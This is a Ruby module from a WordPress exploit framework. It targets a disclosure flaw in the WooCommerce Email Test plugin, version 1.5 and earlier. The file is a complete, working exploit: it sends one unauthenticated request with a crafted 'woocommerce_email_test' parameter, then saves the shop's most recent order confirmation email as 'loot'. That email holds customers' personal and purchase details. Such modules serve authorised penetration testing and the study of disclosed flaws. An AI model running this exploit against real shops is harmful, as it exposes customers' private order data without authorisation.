# frozen_string_literal: true

require 'wpxf/helpers/export'

class Wpxf::Auxiliary::WoocommerceEmailTestOrderDisclosure < Wpxf::Module
  include Wpxf
  include Wpxf::Helpers::Export

  def initialize
    super

    update_info(
      name: 'WooCommerce Email Test <= 1.5 Order Information Disclosure',
      desc: %(
        Versions <= 1.5 of the WooCommerce Email Test plugin allow unauthenticated
        users to download a copy of the last order confirmation e-mail sent by the system.
      ),
      author: [
        'jansass GmbH', # Disclosure
        'rastating'     # WPXF module
      ],
      references: [
        ['WPVDB', '8689']
      ],
      date: 'Dec 08 2016'
    )
  end

  def check
    check_plugin_version_from_readme('woocommerce-email-test', '1.6')
  end

  def run
    return false unless super

    emit_info 'Downloading order confirmation export...'
    res = execute_get_request(
      url: full_uri,
      params: {
        'woocommerce_email_test' => 'WC_Email_Customer_Completed_Order'
      }
    )

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    loot = export_and_log_loot res.body, "The last WooCommerce order confirmation as of #{Time.now}", 'email', '.html'
    emit_success "Saved HTML e-mail to #{loot.path}"
    true
  end
end
